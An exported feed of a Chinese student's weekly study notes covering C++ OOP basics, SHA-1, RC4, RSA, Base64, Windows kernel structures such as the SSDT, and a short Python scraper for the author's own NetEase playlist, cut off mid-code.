用于获取时间的 api 函数有 GetSystemTime、GetLocalTime、GetFileTime，即使不直接使用这些函数，高级语言中封装的类也调用了这些函数。<br>
还有一种方法是读取需要频繁修改的系统文件，利用 FileTimeToSystem()</p>
<h1>面向对象（OOP）涉及到的几个名词</h1>
<p>主要是因为加密与解密里涉及到了（如虚函数）但不懂是啥．．．．</p>
<h2 id="类（class）-对象">类（class）&amp;对象</h2>
<p>类是用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例<br>
当我们定义一个 class 的时候，我们实际上就定义了一种数据类型。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数定义</span></span><br><span class="line">      <span class="built_in">Box</span>(<span class="keyword">double</span> l=<span class="number">2.0</span>, <span class="keyword">double</span> b=<span class="number">2.0</span>, <span class="keyword">double</span> h=<span class="number">2.0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         cout &lt;&lt;<span class="string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;</span><br><span class="line">         length = l;</span><br><span class="line">         breadth = b;</span><br><span class="line">         height = h;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">Volume</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(Box box)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>-&gt;<span class="built_in">Volume</span>() &gt; box.<span class="built_in">Volume</span>();</span><br><span class="line">         <span class="comment">// 每一个对象都能通过this 指针访问自己的地址</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">private</span>:             <span class="comment">//类成员的属性，还可为private 或 protected</span></span><br><span class="line">      <span class="keyword">double</span> length;   <span class="comment">// 盒子的长度</span></span><br><span class="line">      <span class="keyword">double</span> breadth;  <span class="comment">// 盒子的宽度</span></span><br><span class="line">      <span class="keyword">double</span> height;   <span class="comment">// 盒子的高度</span></span><br><span class="line">&#125;;</span><br><span class="line">Box Box1;          <span class="comment">// 声明对象 Box1，类型为 Box</span></span><br><span class="line">Box Box2;          <span class="comment">// 声明对象 Box2，类型为 Box</span></span><br></pre></td></tr></table></figure>
<p>构造函数：实现对象初始化<br>
析构函数：释放对象占用的内存空间<br>
类的作用：安全、继承</p>
<h2 id="继承">继承</h2>
<p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据一个类来定义另一个类，这使得创建和维护一个应用程序变得更容易。这样做，也达到了重用代码功能和提高执行效率的效果。<br>
当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类、父类或超类，新建的类称为派生类或子类。<br>
继承代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物。<br>
如果一个实例的数据类型是某个子类，那么它的数据类型也可以看作是父类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         width = w;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         height = h;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">protected</span>:</span><br><span class="line">      <span class="keyword">int</span> width;</span><br><span class="line">      <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaintCost</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getCost</span><span class="params">(<span class="keyword">int</span> area)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> area * <span class="number">70</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (width * height);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//多继承，即一个子类可以有多个父类，它继承了多个父类的特性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape, <span class="keyword">public</span> PaintCost</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getwhatever</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (width * height *height);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="多态">多态</h2>
<p>多态按字面的意思就是多种形态。存在的必要条件：继承、重写（子类对父类的方法做一定修改）、父类引用指向子类的对象<br>
当子类和父类都存在相同的方法时，子类覆盖了父类的方法</p>
<blockquote>
<p>对于一个变量，我们只需要知道它是 Animal 类型，无需确切地知道它的子类型，就可以放心地调用 run()方法，而具体调用的 run()方法是作用在 Animal、Dog、Cat 还是 Tortoise 对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种 Animal 的子类时，只要确保 run()方法编写正确，不用管原来的代码是如何调用的。<span class="exturl" data-url="aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvODk3NjkyODg4NzI1MzQ0LzkyMzAzMDUwNzcyODM1Mg==">继承和多态<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="虚函数-2">虚函数</h2>
<p>C++中的虚函数的作用主要是实现了多态的机制。基类定义虚函数，子类可以重写该函数；在派生类中对基类定义的虚函数进行重写时，需要在派生类中声明该方法为虚方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="comment">//这里的foo()也可以啥都不输出，即virtual void foo();</span></span></span><br><span class="line"><span class="function">    <span class="comment">//如果写为virtual void foo()=0 则为一个纯虚函数，仅提供一个接口，在继承时必须实现</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;A::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>();   <span class="comment">// 在这里，a虽然是指向A的指针，但是被调用的函数(foo)却是B的!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>带有纯虚函数的类称为抽象类，只能作为基类，且不能定义对象（抽象类这边还涉及到了 abstract 和 virtual，但先不管了…）</p>
<h3 id="虚函数表">虚函数表</h3>
<p>编译器处理虚函数的方法是：为每个类对象添加一个隐藏成员，隐藏成员中保存了一个指向函数地址数组的指针，称为虚表指针，这种数组成为虚函数表。即，每个类使用一个虚函数表，每个类对象用一个虚表指针。</p>
<h2 id="封装">封装</h2>
<p>把数据和函数捆绑在一起。<br>
通过创建类来进行封装和数据隐藏（public、protected、private）。默认情况下，类中定义的项目都是私有的，再提供对外 public 的接口</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span>&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数</span></span><br><span class="line">      <span class="built_in">Adder</span>(<span class="keyword">int</span> i = <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        total = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">addNum</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          total += number;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getTotal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> total;</span><br><span class="line">      &#125;;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="comment">// 对外隐藏的数据</span></span><br><span class="line">      <span class="keyword">int</span> total;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>python 爬虫学习</h1>
<p><a href="https://brubbish.github.io/710f8e5f.html#RE%E5%BA%93%E7%9A%84match%E5%AF%B9%E8%B1%A1">https://brubbish.github.io/710f8e5f.html#RE库的match对象</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.13-2020.04.19</title>
    <url>/32820.html</url>
    <content><![CDATA[<h1>加密算法</h1>
<h2 id="单向散列算法">单向散列算法</h2>
<h3 id="SHA算法">SHA算法</h3>
<p>安全散列算法，包括SHA-1,SHA-256,SHA-384,SHA-512,分别产生160位、256位、384位、512位散列值</p>
<h4 id="SHA-1算法">SHA-1算法</h4>
<p>原始消息长度不能超过2^64<br>
sha-1算法与md4算法原理相同，消息分组和填充方式和md5算法相同(到md5的第二步)</p>
<span id="more"></span>
<p>sha-1初始散列值用5个32位双字进行初始化，如图：<br>
<img src="https://s1.ax1x.com/2020/04/14/GzwQKK.png" alt=" "><br>
运算时使用到的常数：<br>
<img src="https://s1.ax1x.com/2020/04/14/GzwlDO.png" alt=" "><br>
用以上两组数识别sha-1算法</p>
<h2 id="对称加密算法">对称加密算法</h2>
<p>加密和解密的密钥完全相同<br>
安全性依赖于：</p>
<ol>
<li>加密算法足够强，无法根据密文直接获得原文</li>
<li>密钥的秘密性</li>
</ol>
<p>在使用时，把用户输入的注册码（或注册码的一部分等）作为算法的密钥。如果在检查注册码时把用户的输入作为算法的输出或输入，解密者都可以找到所用的密钥<br>
常用的对称分组加密算法有：DES、IDEA、AES等</p>
<p>对称密码分为：</p>
<ol>
<li>流密码：对每一个比特都作为基本处理单元进行加密</li>
<li>块密码（分组密码）：先分块，再对每一块进行加密</li>
</ol>
<h3 id="RC4流密码">RC4流密码</h3>
<h4 id="原理">原理</h4>
<p>生成一种伪随机流（称为密钥流），与长度相同的明文通过异或（相同为假，不同为真）操作进行加密；解密时也与密文进行异或操作<br>
密钥流分为KSA和PRGA两部分</p>
<ol>
<li>
<p>KSA（the key-scheduling algorithm)</p>
<ol>
<li>先对一个256字节的数组S进行初始化，按顺序填入0~255</li>
<li>如果输入的密钥长度小于256字节，则按密钥的填充输入的密钥（如输入1，2，3，4，5，填为1，2，3，4，5，1，2，3，…  放入数组T</li>
<li>对1中数组元素做如下交换</li>
</ol>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        　j = <span class="number">0</span>;</span><br><span class="line">    　  　<span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">256</span> ; i++)&#123;</span><br><span class="line">      　　　　j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">      　　　　swap(S[i] , S[j]);</span><br><span class="line">      　　&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>PRGA（the pseudo-random gerneration algorithm)</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123;<span class="comment">//明文长度datalength</span></span><br><span class="line">　　　i = (i + <span class="number">1</span>) mod <span class="number">256</span>;</span><br><span class="line">　　　　j = (j + S[i]) mod <span class="number">256</span>;</span><br><span class="line">　　　　swap(S[i] , S[j]);</span><br><span class="line">　　　　t = (S[i] + S[j]) mod <span class="number">256</span>;</span><br><span class="line">　　　　k = S[t];<span class="comment">//这里的K就是当前生成的一个秘钥流中的一位</span></span><br><span class="line">　　　　<span class="comment">//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="公开密钥加密算法">公开密钥加密算法</h2>
<p>亦称非对称加密算法。在加密与解密时用不同的密钥，加密用的密钥叫做公钥，解密用的密钥叫做私钥<br>
公开密钥的设计基于<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNzY4NDgzL2FydGljbGUvZGV0YWlscy84MDQzMDU5MA==">NP完全问题<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="RSA算法">RSA算法</h3>
<p>算法的安全性依赖于大整数因式分解（主要是分解n），密钥位数越长就越安全</p>
<h4 id="原理-2">原理</h4>
<ol>
<li>选取两个较大素数p，q（用算法随机产生两个数，使用概率算法来验证是否质数。假如通过了这个测试的话，那么要使用一个精确的测试来保证的确是质数。）且pq不能太接近</li>
<li>n=pq，n称为模</li>
<li>计算欧拉函数φ(n)=(p-1)(q-1)</li>
<li>选取加密密钥e，e常用值为3、7和（2^16+1)</li>
<li>使用扩展欧几里得算法，求出d</li>
<li>公钥为e和n；私钥为d；p，q必须保密</li>
<li>把消息进行分组，每组长度比n小，将每组都根据公式进行加密的计算</li>
<li>解密时，取每一个分组按公式进行解密</li>
</ol>
<h2 id="Base64算法">Base64算法</h2>
<p>将二进制数据编码为字母和数字，用于非文本传输。使用ASCII（A~/)第65个字符为“=”），并用6个进制位表示一个可显示字符<br>
编码时：</p>
<ol>
<li>将第一个字节放置于24位缓冲区的高8位，第二个字节放在中间的8位，第三个字节放在低8位（少于3个字节，相应的缓冲区置0）</li>
<li>对24位缓冲区以6位为一组作为索引，高位优先，从ASCII表取出对应数值的元素进行输出,置0的位置输出“=”</li>
</ol>
<p>如：对单词sky：<br>
<img src="https://s1.ax1x.com/2020/04/17/JZN1ER.png" alt=" "><br>
<img src="https://s1.ax1x.com/2020/04/17/JZdBVJ.jpg" alt=" "><br>
再根据28-&gt;c;54-&gt;2;…<br>
得到sky对应的base64编码</p>
<p>在url和cookie里“=”会造成歧义，因此很多base64编码在最后会把&quot;=&quot;去掉。<br>
因为<strong>base64编码的长度永远是4的倍数</strong>，所以可以确定少了几个“=”</p>
<h2 id="加密算法在软件保护的应用">加密算法在软件保护的应用</h2>
<p>不仅包括软件的注册激活系统、软件的防逆向，还包括软件涉及的数据的安全保护，包括存储数据的加密和数据交换的加密协议，如聊天软件的加密协议、游戏客户端与服务器通信的协议包、智能硬件和app通信的命令协议等<br>
高等难度级别的保护方案可以设计得简单也可以复杂：<br>
简单：例如对用户名处理时把哈希、对称、公钥算法全都用上，或者用难以分析的算法例如ecdsa。流程很简单但破解门槛很高<br>
复杂：可以使用不常见的算法（没有特征）、使用自己的算法，如果用公开的算法库，要去掉一些特征字符串，从而识别不出用了哪个算法库</p>
<h1>Windows内核</h1>
<p>操作系统一般分为应用层和内核层，应用层通过系统调用进入内核，由系统底层完成相应功能；内核处理某些硬件发来的中断请求，代替硬件完成某些功能</p>
<h2 id="内核理论基础">内核理论基础</h2>
<h3 id="权限级别">权限级别</h3>
<p>cpu的运行级别依次为R0（最高执行权限）、R1、R2、R3（最低执行权限），r0运行内核，r1、r2运行设备驱动，r3运行应用程序。为了让工作变得简单，现在cpu和操作系统只保留了r0和r3，驱动运行在r0级</p>
<h3 id="内存空间布局">内存空间布局</h3>
<p>32位寻址支持2^32B（4GB）的虚拟内存空间，其中系统的内存主要分为内核空间和应用层空间，每部分约占2GB，还有64kb的null空间和非法区域<br>
64位理论支持最大2^64kb的寻址空间，但因为太大用不完所以只支持到40多位（…顺便32位和64位cpu地址总线不一定是32/64，32位通过PAE扩展到36位；64位只有4x位）</p>
<h3 id="Windows启动过程">Windows启动过程</h3>
<ol>
<li>自检<br>
从bios载入指令，进行硬件的初始化检查</li>
<li>初始化启动<br>
根据cmos的设置，bios加载启动盘，将主引导记录（mbr）[1]中的引导代码载入内存。启动代码搜索mbr中的分区表,找出活动分区，将引导代码载入内存。引导代码查找并启动ntldr文件，bios将控制权转移给ntldr</li>
<li>boot加载
<ol>
<li>设置内存模式</li>
<li>启动文件系统，定位boot.ini等启动文件</li>
<li>读取boot.ini</li>
</ol>
</li>
<li>检测和配置硬件<br>
检查和配置硬件设备如系统固件、适配器、输入设备等</li>
<li>内核加载
<ol>
<li>加载系统内核的ntoskrnl.exe[2]和硬件抽象层（HAL,内核与硬件电路之间的接口层)。</li>
<li>从注册表读取安装的驱动程序，然后依次加载</li>
</ol>
</li>
<li>Windows会话管理启动<br>
会话管理器程序：smss.exe，是系统第一个创建的用户模式进程</li>
<li>用户登录<br>
由winlogon.exe系统服务提供，完成：
<ol>
<li>启动服务子系统，即服务控制管理器</li>
<li>启动本地安全授权过程</li>
<li>显示登录界面</li>
</ol>
</li>
</ol>
<p>用bios和mbr的启动方式具有局限性，新的系统引导方式用UEFI和GPT。<br>
UEFI（统一的可扩展固件接口）突破了读取分区容量最高仅为2tb的限制；并且UEFI本身相当于一个微型操作系统，可以直接读取FAT分区中的文件，程序员可以开发出直接在UEFI下运行的程序。因此可以将Windows安装程序做成efi类型的应用程序，从而不需要主引导记录、活动分区等，就可以启动Windows<br>
GPT（全局唯一标识分区表）可以对分区数量没有限制（Windows限制在128个以内），可管理磁盘大小为18eb，只有基于uefi平台的主板才支持gpt分区引导启动</p>
<p>[1]: Master Boot Record，包括启动代码、硬盘分区表、结束标志字，包含MBR引导代码的扇区称为主引导扇区<br>
[2]: Windows NT operating system kernel,为内核空间提供内核和执行层，并负责一些系统服务</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.20-2020.04.26</title>
    <url>/45941.html</url>
    <content><![CDATA[<h1>Windows内核基础</h1>
<h2 id="内核理论基础">内核理论基础</h2>
<h3 id="Windows-r0和r3通信">Windows r0和r3通信</h3>
<p>当一个应用程序调用一个有关io的api，事实上这个api被封装在应用层的某个dll库文件中，dll动态库中函数调用的更底层的函数包含在ntdll.dll文件中。<br>
当应用层的某个api通过ntdll.dll里的native api执行时，会完成参数检查工作，再用一个中断指令从r3层进入r0层。</p>
<span id="more"></span> 
<p>ntdll.dll中的函数时成对出现的，分别以“nt”和“zw”开头，如ntcreatefile、zwcreatefile<br>
从用户模式调用nt* 和zw* api,连接ntdll.lib：<br>
  二者都是通过设置系统服务表中的索引和在栈中设置参数，通过sysenter或syscall指令进入内核态，并最终跳转到kiservicetable对应的系统服务例程中。代码会严格检查从用户空间传入的参数<br>
从内核模式调用nt* 和zw* api,连接ntdll.lib：<br>
  nt* api将直接调用对应函数，zw* api通过kisystemservice跳转到对应的函数代码<br>
调用nt* api时不会改变previous mode（分为用户态和内核态）的状态；调用zw* api时会将previous mode 改为内核态。使用zw* api可以避免额外的参数列表检查，提高效率</p>
<p>内核主要由各种驱动（在磁盘上时.sys文件）组成，有的是系统自带的，有的是软件厂商提供的。驱动加载后会生成对应的设备对象，并可以选择向r3提供一个可供访问和打开的符号链接<br>
应用层程序可以根据符号链接调用CreateFile()函数打开，在获得句柄后，程序就可以调用应用层函数与内核驱动进行通信<br>
  符号链接（软链接）：a symbolic link is a file that links to another file or directory using its path.然后大概是路径可以自动变的快捷方式…吧<br>
内核驱动执行DriverEntry()函数后就可以接受r3层的通信请求了。内核驱动中专门有一组函数用于响应应用层的调用请求</p>
<h3 id="内核函数">内核函数</h3>
<p>前缀：<br>
<img src="https://s1.ax1x.com/2020/04/24/JDmOoR.png" alt=" "></p>
<p>调用内核函数要注意它的中断请求级别（IRQL,Interrupt Request Level）要求。内核在不同情况下会运行在不同的IRQL级别上，此时必须调用符合该级别的内核函数</p>
<p><img src="https://s1.ax1x.com/2020/04/24/JD0lBd.png" alt=" "></p>
<p>passive_level：最低级别，对所有中断都可以做出响应，<strong>用户模式代码都运行在该中断级别上</strong>，可以访问分页内存<br>
apc_level：只有apc级别的中断可以被屏蔽，可以访问分页内存，分页调度管理就运行在该级别上<br>
dispatch_level:该级别和更低的中断被屏蔽，不能访问分页内存，只能处理不可分页的内存，因此在这个级别上能访问的api大大减少。线程调度运行在该级别上。线程调度用于执行多任务，由时钟中断来保证，因此该级别的中断即是调度中断。这个级别对一些严重中断不进行处理，所以要慎重使用（emmm…)<br>
DIRQL（Device IRQL）：IRQL的最高级别，在该级别上的中断都会被忽略，通常用于判断设备优先级</p>
<ul>
<li>分页内存：<br>
在保护模式中，内存访问使用分段机制，即&quot;段基址:段内偏移地址&quot;；操作系统将一些进程不常用的内存放到硬盘中，腾出内存空间，在一定程度上解决了内存不足的问题，但如果内存特别小，就会无法容纳任何一个进程的段。这个问题的原因是在只有分段的情况下，cpu认为线性地址等于物理地址，所以物理地址也必须要连续，但实际上可用的物理地址不连续。为了解决这个问题，需要让物理地址和线性地址重新建立映射，让前者不连续，后者连续，由此引出内存分页机制<br>
分页机制建立在分段机制的基础上，因此分页在分段后进行。在内存分页机制下，由“段基址:段内偏移地址”得到的线性地址不是物理地址而是虚拟地址，对应的物理地址要在页表中查找。<br>
分页机制提供连续线性地址到不连续物理地址的映射，以及用大小相等的页代替大小不相等的段</li>
</ul>
<h3 id="内核驱动模块">内核驱动模块</h3>
<p>内核驱动扩展名为.sys</p>
<ul>
<li>驱动的加载和执行<br>
创建一个服务（注册表），在services键下（…\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\）建立一个与驱动名称相关的服务键，服务键规定了驱动的一些属性，如加载的先后等<br>
对象管理器生成驱动对象，并传递给DriverEntry()函数，执行DriverEntry()函数。（DriverEntry()是驱动执行的入口函数）<br>
创建控制设备对象；创建控制设备符号链接；如果是过滤驱动，则创建过滤设备对象并绑定<br>
注册特定的分发派遣函数<br>
其他初始化动作，如hook、过滤（如文件过滤、防火墙过滤）等的注册和 初始化</li>
</ul>
<p> *过滤驱动就是挂载在其他驱动上，对某设备的irp(I/O Request Package)进行拦截过滤作用，可以对设备进行功能扩展，或是数据加密等的驱动程序。</p>
<h2 id="内核的数据结构">内核的数据结构</h2>
<h3 id="内核对象">内核对象</h3>
<p>内核对象是一种Windows内核中的数据结构管理机制。应用层的进程、线程、文件、等对象或打开的句柄在内核中都有对应的内核对象<br>
一个内核对象可以分为对象头和对象体。对象头中至少有一个OBJECT_HEADER和对象额外信息。对象体紧接着对象头中的OBJECT_HEADER。一个指针总是指向对象体而不是对象头，将对象体指针减去偏移值，获得OBJECT_HEADER的结构，从而访问其他对象结构辅助信息<br>
<img src="https://s1.ax1x.com/2020/04/26/JcAJKO.png" alt=" "><br>
内核对象分为：</p>
<ol>
<li>Dispatcher对象<br>
在对象体开始位置放置了一个共享的公共数据结构DISPATCHER_HEADER，包含了这个结构的内核对象名字都以K开头（但K开头的不一定都是这个对象），这些内核对象都是可以等待的（(waitable):①当到达某一个时间后，才继续线程的执行。/②当到达某一个时间后，调用某一个函数，而且间隔多少时间后，再次调用。）</li>
<li>io对象<br>
在开始位置不放置DISPATCHER_HEADER，但通常放置一个与type和size有关的整型成员。</li>
<li>其他对象<br>
包括进程对象(EPROCESS)和线程对象(ETHREAD)等<br>
EPROCESS用于管理进程的各种信息，每一个进程都对应一个EPROCESS结构，用于记录进程执行期间的各种数据。<br>
第一个成员是进程的对象KPROCESS，所有进程的EPROCESS内核结构都被放入一个双向链表，R3在枚举系统进程的时候，通过遍历这个链表获得了进程的列表</li>
</ol>
<p>ETHREAD结构是线程的内核管理对象，每一个线程都有一个对应的ETHREAD结构。结构的第一个成员是线程对象KTHREAD，所有的ETHREAD结构也被放在一个双向链表里<br>
<img src="https://s1.ax1x.com/2020/04/26/JcAYrD.png" alt=" "></p>
<h3 id="SSDT">SSDT</h3>
<p>“system services descriptor table”, 在内核中的实际名称是&quot;KeServiceDscriptorTable&quot;<br>
用于处理应用层通过Kernel32.dll下发的各个api操作请求。当kernel32.dll的api通过ntdll.dll时，会先完成对参数的检查，在调用一个中断，从而实现r3层进入r0层。</p>
<p>SSDT表中最重要的两个成员为ServiceTableBase（表的基地址）和NumberOfServices（系统中SSDT服务函数的个数）<br>
由ssdt表的基地址和ssdt函数的索引号可以求出对应的服务函数的地址（32位和64位计算公式不同）</p>
<h4 id="Shadow-SSDT">Shadow SSDT</h4>
<p>原理和SSDT类似，对应的表名为KeServiceDscriptorTable<strong>Shadow</strong>，是内核未导出（不能在自己的模块中导入和直接引用）的一张表，包含Ntoskrnel.exe和win32.sys服务函数。<br>
hook该表中的某些函数可以实现截屏保护、模拟按键、防止窗口被关闭等</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>一个爬取自己网易云歌单的爬虫</title>
    <url>/53778.html</url>
    <content><![CDATA[<p>现在只弄了红心歌单<br>
可以得出每个歌手的出现次数（不包括多人唱一首的情况）<br>
还没有排序<br>
也不能输出到文件<br>
参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z1MjU0OTgzMzAzL2FydGljbGUvZGV0YWlscy83OTQzNDg4Mg==">https://blog.csdn.net/fu254983303/article/details/79434882<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;</span><br><span class="line">r=requests.get(<span class="string">&#x27;https://music.163.com/playlist?id=xxxxxxxxx&#x27;</span>,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">html=r.text</span><br><span class="line">reg_list = <span class="string">&#x27;&lt;ul class=&quot;f-hide&quot;&gt;&lt;li&gt;(.*?)&lt;/ul&gt;&#x27;</span></span><br><span class="line">reg_list = re.<span class="built_in">compile</span>(reg_list, re.S)</span><br><span class="line">content = re.findall(reg_list, html)</span><br><span class="line">reg = <span class="string">&#x27;&lt;a href=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&lt;/li&gt;&#x27;</span>  </span><br><span class="line">reg = re.<span class="built_in">compile</span>(reg, re.S)</span><br><span class="line">song_list = re.findall(reg, content[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">singer=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    singer.append([<span class="number">0</span>]*<span class="number">2</span>)</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> song_list:</span><br><span class="line">    url=<span class="string">&quot;https://music.163.com&quot;</span>+song_list[i][<span class="number">0</span>]</span><br><span class="line">    r=requests.get(url,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">    htm=r.text</span><br><span class="line">    reg_list2=<span class="string">&#x27;&lt;p class=&quot;des s-fc4&quot;&gt;歌手：&lt;span title=&quot;(.*?)&quot;&gt;&#x27;</span></span><br><span class="line">    reg_list2=re.<span class="built_in">compile</span>(reg_list2,re.S)</span><br><span class="line">    s=re.findall(reg_list2,htm)</span><br><span class="line"></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            